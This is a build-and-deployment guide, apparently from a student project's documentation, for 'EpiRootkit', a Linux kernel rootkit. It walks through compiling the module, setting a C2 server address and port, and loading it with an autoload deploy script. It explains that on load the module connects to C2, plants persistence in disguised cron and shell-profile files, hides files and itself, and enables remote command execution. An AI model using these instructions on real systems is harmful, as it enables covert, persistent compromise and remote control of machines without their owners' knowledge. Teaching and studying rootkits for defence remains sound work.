---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 502
---

# Build & Deployment

How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.

## Deployment Architecture

EpiRootkit follows a **two-stage deployment** approach:
- **Stage 1 (Loader)**: `scripts/deploy_rootkit.sh` handles proper module deployment
- **Stage 2 (Runtime)**: Rootkit focuses on functionality, not self-deployment

This separation follows Linux kernel module best practices and eliminates unusual self-copying behavior.

## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)
- **Architecture**: x86_64

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```

## Build Process

### 1. Navigate to Rootkit Directory
```bash
cd rootkit
```

### 2. Build the Module
```bash
make clean && make
```

**Expected output:**
```
make -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules
  CC [M]  /path/to/rootkit/core/main.o
  CC [M]  /path/to/rootkit/commands/commands.o
  CC [M]  /path/to/rootkit/commands/auth_commands.o
  CC [M]  /path/to/rootkit/commands/exec_commands.o
  CC [M]  /path/to/rootkit/commands/file_commands.o
  CC [M]  /path/to/rootkit/commands/status_commands.o
  CC [M]  /path/to/rootkit/commands/stealth_commands.o
  CC [M]  /path/to/rootkit/network/connection.o
  CC [M]  /path/to/rootkit/network/socket.o
  CC [M]  /path/to/rootkit/network/keepalive.o
  CC [M]  /path/to/rootkit/stealth/stealth.o
  CC [M]  /path/to/rootkit/persistence/persistence.o
  CC [M]  /path/to/rootkit/security/auth.o
  CC [M]  /path/to/rootkit/security/crypto.o
  CC [M]  /path/to/rootkit/utils/sysfs.o
  LD [M]  /path/to/rootkit/epirootkit.ko
```

### 3. Verify Build
```bash
ls -la epirootkit.ko
file epirootkit.ko
```

Should show: `ELF 64-bit LSB relocatable, x86-64`

## Configuration

### Network Settings
Edit `rootkit/core/config.h` before building:

```c
#define C2_SERVER_IP "192.168.64.1"    // Your C2 server IP
#define C2_SERVER_PORT 4444             // C2 server port
```

### Feature Settings
```c
#define ENABLE_ENCRYPTION 0      // Encryption disabled
#define ENABLE_PERSISTENCE 1     // Auto-install persistence
#define ENABLE_FILE_HIDING 1     // Hide files with prefixes
```

## Deployment Methods

### Method 1: Deployment Script (Recommended)
Uses the proper loader stage for deployment:

```bash
# Deploy using the deployment script
sudo ./scripts/deploy_rootkit.sh

# Or specify custom module path
sudo ./scripts/deploy_rootkit.sh /path/to/epirootkit.ko
```

**What the deployment script does:**
1. **Validates** module and root privileges
2. **Deploys module** to `/lib/modules/$(uname -r)/extra/`
3. **Sets up autoload** via `/etc/modules-load.d/epirootkit.conf`
4. **Updates dependencies** with `depmod -a`
5. **Loads module** immediately
6. **Verifies** deployment

### Method 2: Manual Loading (Basic)
For development and testing:

```bash
sudo insmod epirootkit.ko
```

### Verify Loading
```bash
# Check if loaded (may be hidden if stealth enabled)
lsmod | grep epirootkit

# Alternative check if module is hidden
ls -la /sys/module/epirootkit

# Check kernel messages
dmesg | tail -10
```

**Expected kernel messages:**
```
[  123.456] EpiRootkit: Starting initialization (v1.0.0)
[  123.457] EpiRootkit: Connection module initialized
[  123.458] EpiRootkit: Stealth module initialized
[  123.459] EpiRootkit: Persistence module initialized
[  123.460] EpiRootkit: All subsystems initialized successfully
[  123.461] EpiRootkit: Attempting connection to 192.168.64.1:4444
```

## Deployment Management

### Check Status
```bash
sudo ./scripts/deploy_rootkit.sh status
```

### Complete Removal
```bash
sudo ./scripts/deploy_rootkit.sh uninstall
```

## Automatic Features

When the module loads, it automatically:

1. **Connects to C2 server** (if running)
2. **Installs runtime persistence** (cron, shell profiles)
3. **Enables file hiding** (hides files with specific prefixes)
4. **Starts keepalive system** (60-second ping/pong)

**Note**: Module deployment persistence is handled by the deployment script, not the runtime module.

## Module Management

### Unload Module
```bash
sudo rmmod epirootkit
# Or use Makefile target
sudo make remove
```

### Manual Persistence Cleanup
```bash
# Remove runtime persistence mechanisms only
sudo rm -f /etc/cron.d/system-update
sudo rm -f /etc/profile.d/system-env.sh

# Module deployment persistence (handled by deployment script)
sudo rm -f /etc/modules-load.d/epirootkit.conf
sudo rm -f /lib/modules/$(uname -r)/extra/epirootkit.ko
```

### Clean Build
```bash
make clean
```

## File Locations

### Deployment Files (by deploy script)
- **Module**: `/lib/modules/$(uname -r)/extra/epirootkit.ko`
- **Autoload**: `/etc/modules-load.d/epirootkit.conf`

### Runtime Files (by rootkit)
- **Cron**: `/etc/cron.d/system-update`
- **Profile**: `/etc/profile.d/system-env.sh`

## Next Steps

1. **[Start C2 Server](../03-attacking-program/overview.md)**: Set up command & control
2. **[Authentication](./connection-authentication.md)**: Connect and authenticate
3. **[Use Commands](./features/command-execution.md)**: Execute remote commands

